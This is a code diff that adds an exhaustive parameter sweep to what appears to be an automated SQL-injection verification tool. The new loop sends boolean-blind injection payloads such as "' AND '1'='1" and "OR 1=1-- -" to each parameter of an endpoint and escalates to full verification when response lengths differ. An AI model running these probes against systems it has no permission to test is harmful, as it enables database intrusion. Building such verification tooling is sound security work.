@@ -4318,6 +4318,81 @@ def verify_generic_sqli_blind(
                     )
                     if _gen_rot_s.verified:
                         return _gen_rot_s
+            # Exhaustive param sweep (boolean-only, fast): when no sqli_param_hint was given
+            # AND the hint-based rotation didn't fire, try every remaining param with just the
+            # boolean-blind check (no full time-based scan). ~8 requests per param so 5 extra
+            # params costs ~40 extra requests — worth it to catch non-hint names like `sorting`.
+            # Skip this sweep when sqli_param_hint was explicitly provided (the caller knows
+            # which param to try) or when _tried_params_set already has 3+ entries.
+            _sweep_tried = (_tried_params_set or frozenset()) | {sqli_param}
+            if (not res.verified and not sqli_param_hint
+                    and parameters and len(_sweep_tried) < 4):
+                _sweep_names = (list(parameters.keys()) if isinstance(parameters, dict)
+                                else list(parameters))
+                # Skip pagination/filter params that virtually never carry SQL taint
+                _sweep_skip = {"page", "limit", "offset", "per_page", "format", "callback",
+                               "lang", "locale", "timezone", "debug", "pretty"}
+                _sweep_cands = [
+                    p for p in _sweep_names
+                    if p not in _sweep_tried and p.lower() not in _sweep_skip
+                ][:5]
+                for _sweep_p in _sweep_cands:
+                    if res.verified:
+                        break
+                    step(f"SQLi param sweep (boolean-only): probando '{_sweep_p}' "
+                         f"(sin hint, {len(_sweep_tried)} ya intentados)...")
+                    _sweep_base = dict(base_params)
+                    _sweep_orig = str(_sweep_base.get(_sweep_p) or "1")
+                    _sweep_threshold = max(8, int((_ctrl_len if isinstance(_ctrl_len, int) else 20) * 0.05))
+
+                    def _sweep_send(val: str) -> Optional[int]:
+                        _p2 = dict(_sweep_base); _p2[_sweep_p] = val
+                        try:
+                            _r2 = _http_request(m, base_url + endpoint_path, timeout=12,
+                                                data=_p2 if m != "GET" else None,
+                                                params=_p2 if m == "GET" else None,
+                                                headers=custom_headers or None)
+                            return len(getattr(_r2, "text", "") or "")
+                        except Exception:
+                            return None
+
+                    _sweep_ctrl = _sweep_send(_sweep_orig)
+                    if _sweep_ctrl is None:
+                        _sweep_tried = _sweep_tried | {_sweep_p}
+                        continue
+                    _sweep_th2 = max(8, int(_sweep_ctrl * 0.05))
+                    _sweep_hit = False
+                    for _sp_true, _sp_false in [
+                        (f"{_sweep_orig}' AND '1'='1", f"{_sweep_orig}' AND '1'='2"),
+                        (f"{_sweep_orig} AND 1=1-- -", f"{_sweep_orig} AND 1=2-- -"),
+                        (f"{_sweep_orig}' OR '1'='1",  f"{_sweep_orig}' OR '1'='2"),
+                        (f"{_sweep_orig} OR 1=1-- -",  f"{_sweep_orig} OR 1=2-- -"),
+                    ]:
+                        _t = _sweep_send(_sp_true)
+                        _f = _sweep_send(_sp_false)
+                        if (_t is not None and _f is not None
+                                and abs(_t - _f) >= _sweep_th2
+                                and abs(_t - _sweep_ctrl) < max(100, _sweep_ctrl // 2)):
+                            # Found a differential — escalate to full verify with this param
+                            step(f"SQLi param sweep: diferencial en '{_sweep_p}' "
+                                 f"({abs(_t - _f)}B) — escalando a verificacion completa...")
+                            _sweep_full = verify_generic_sqli_blind(
+                                source_dir, endpoint, http_method, parameters,
+                                sqli_param_hint=_sweep_p, on_step=on_step,
+                                budget_s=max(60.0, budget_s * 0.3),
+                                sqli_identifier_table_hint=sqli_identifier_table_hint,
+                                custom_headers=custom_headers, setup_commands=setup_commands,
+                                dockerfile_body=dockerfile_body, extra_files=extra_files,
+                                confirm_string=confirm_string,
+                                _tried_params_set=_sweep_tried | {_sweep_p},
+                            )
+                            if _sweep_full.verified:
+                                return _sweep_full
+                            _sweep_hit = True
+                            break
+                    _sweep_tried = _sweep_tried | {_sweep_p}
+                    if _sweep_hit:
+                        break
             if not res.verified and res.confidence == "none":
                 res.confidence = "inconclusive"
         # --- Header injection fallback (generic) ---
